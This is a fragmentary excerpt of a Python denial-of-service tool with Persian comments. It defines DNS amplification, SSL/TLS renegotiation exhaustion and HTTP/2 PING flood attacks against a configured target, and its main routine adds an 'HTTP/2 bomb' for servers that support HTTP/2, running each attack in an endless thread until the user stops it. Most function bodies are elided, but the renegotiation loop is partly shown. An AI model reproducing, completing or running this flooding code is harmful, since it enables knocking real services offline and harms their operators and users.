...
def attack_dns_amplification():
    """DNS Amplification - درخواست‌های DNS با اندازه‌ی بزرگ"""
...
def attack_ssl_renegotiation():
    """SSL Renegotiation - خسته کردن SSL/TLS"""
    ...
    while not STOP_FLAG:
        try:
            ...
            # ارسال درخواست و شروع دوباره‌ی مذاکره
            for _ in range(50):
                try:
                    ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + TARGET.encode() + b"\r\n\r\n")
                    ssl_sock.recv(1024)
                    # درخواست renegotiation
...
def attack_http2_ping_flood():
    """HTTP/2 PING Flood - ارسال PING‌های سنگین"""
...
def main():
    ...
    # اگه سرور HTTP/2 ساپورت کنه، بمب رو اضافه کن
    if 'http2' in info['protocols']:
        attacks.append(attack_http2_bomb)
    
    # اجرای هر حمله در یک ترد جداگانه (بی‌نهایت)
    ...
    # منتظر موندن تا کاربر Ctrl+C بزنه
    try:
